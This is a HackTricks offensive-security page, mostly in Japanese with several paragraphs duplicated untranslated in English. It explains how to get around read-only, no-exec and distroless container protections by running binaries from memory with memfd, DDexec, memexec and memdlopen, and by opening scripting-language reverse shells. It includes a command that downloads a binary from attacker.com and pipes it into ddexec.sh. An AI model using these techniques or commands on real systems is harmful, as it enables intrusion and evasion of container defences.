# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## 動画

以下の動画では、このページで触れている技術がより詳細に説明されています:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec シナリオ

コンテナ内では特に、Linux マシンが **read-only (ro) file system protection** でマウントされているケースが増えています。これは、コンテナを ro ファイルシステムで実行するのが `securitycontext` に **`readOnlyRootFilesystem: true`** を設定するだけで簡単にできるためです:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

とはいえ、ファイルシステムが ro でマウントされていても **`/dev/shm`** は引き続き書き込み可能なので、「ディスクに何も書き込めない」というのは正確ではありません。ただし、このフォルダは **no-exec 保護でマウントされる**ため、ここにバイナリをダウンロードしても **実行することはできません**。

> [!WARNING]
> red team の観点では、これはシステムに既に存在しないバイナリ（backdoors や `kubectl` のような列挙ツールなど）を **ダウンロードして実行する**ことを非常に複雑にします。

## Easiest bypass: Scripts

ここまでバイナリの話をしてきましたが、マシン内にインタプリタがあれば任意のスクリプトは **実行可能**です。例えば `sh` があれば **shell script** を、`python` があれば **python script** を実行できます。

しかし、これだけではバイナリの backdoor や他のバイナリツールを実行するには不十分な場合があります。

## Memory Bypasses

ファイルシステムがバイナリの実行を許さない場合、最良の方法はそれを **memory から実行する**ことです。なぜならこれらの保護はメモリ上には適用されないからです。

### FD + exec syscall bypass

マシン内に Python、Perl、Ruby のような強力なスクリプトエンジンがある場合、バイナリをメモリから実行するためにダウンロードし、memory file descriptor（`create_memfd` syscall）に格納してから **`exec` syscall** を呼び出し、**fd を実行するファイルとして指定**することができます。

この用途にはプロジェクト [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) を簡単に使えます。バイナリを渡すと、指定した言語のスクリプトを生成し、**binary を圧縮して b64 エンコード**し、`create_memfd` syscall で作成した **fd** に **デコードと展開**を行って格納し、最後に **exec** syscall を呼んで実行する手順を組み込みます。

> [!WARNING]
> これは PHP や Node のような他のスクリプト言語では動作しません。これらはスクリプトから生の syscall を呼ぶ**デフォルトの方法**を持っていないため、`create_memfd` を呼んで **memory fd** を作成することができないからです。
>
> さらに、`/dev/shm` にファイルを置いて通常の fd を作成しても、no-exec 保護が適用されるため実行はできません。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、自プロセスの **`/proc/self/mem`** を上書きすることでプロセスのメモリを変更できる技術です。

したがって、プロセスで実行されているアセンブリコードを**制御**することで、**shellcode** を書き込み、プロセスを「変異」させて **任意のコードを実行**させることができます。

> [!TIP]
> **DDexec / EverythingExec** により、独自の **shellcode** や **any binary** を **memory** からロードして **execute** することが可能になります。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.

[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec shellcode demonised** で、別のバイナリを実行したいたびに DDexec を再起動する必要がなく、DDexec テクニック経由で memexec の shellcode を実行し、その deamon と通信してロード・実行する新しいバイナリを渡すことができます。

You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.

DDexec と同様の目的で、[**memdlopen**](https://github.com/arget13/memdlopen) テクニックはバイナリをメモリに読み込んで後で実行するための、より簡単な方法を提供します。依存関係を持つバイナリの読み込みすら可能にする場合があります。

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.

The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.

Distroless コンテナは、ライブラリやランタイム依存関係のような特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネントのみを含み、package manager、shell、system utilities のような大きなコンポーネントは除外します。

Distroless コンテナの目的は、不要なコンポーネントを排除してコンテナの攻撃対象領域を削減し、悪用可能な脆弱性の数を最小限にすることです。

### Reverse Shell

In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.

distroless コンテナでは、通常のシェルを得るための `sh` や `bash` すら見つからないことがあります。また、`ls`、`whoami`、`id` のようなバイナリも見つからず、通常システム上で実行するものは一切ありません。

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

> [!WARNING]
> したがって、通常のように **reverse shell** を取得したり、システムを **enumerate** することはできません。

However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.

ただし、例えば侵害されたコンテナが flask ウェブを実行している場合は python がインストールされているため、**Python reverse shell** を取得できます。node を実行している場合は Node rev shell を取得でき、ほとんどの **scripting language** でも同様です。

> [!TIP]
> Using the scripting language you could **enumerate the system** using the language capabilities.

> [!TIP]
> スクリプト言語を使えば、その言語の機能でシステムを **enumerate** することが可能です。

If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.

もし **`read-only/no-exec`** 保護が無ければ、reverse shell を悪用してファイルシステムにバイナリを書き込み、それらを **execute** することができます。

> [!TIP]
> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

> [!TIP]
> ただし、この種のコンテナでは通常これらの保護が存在しますが、**previous memory execution techniques を使ってそれらをバイパス** することができます。

You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

スクリプト言語の **reverse shells** を取得し、メモリからバイナリを実行するためにいくつかの RCE 脆弱性を **exploit** する方法の **examples** は [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) にあります。


{{#include ../../../banners/hacktricks-training.md}}
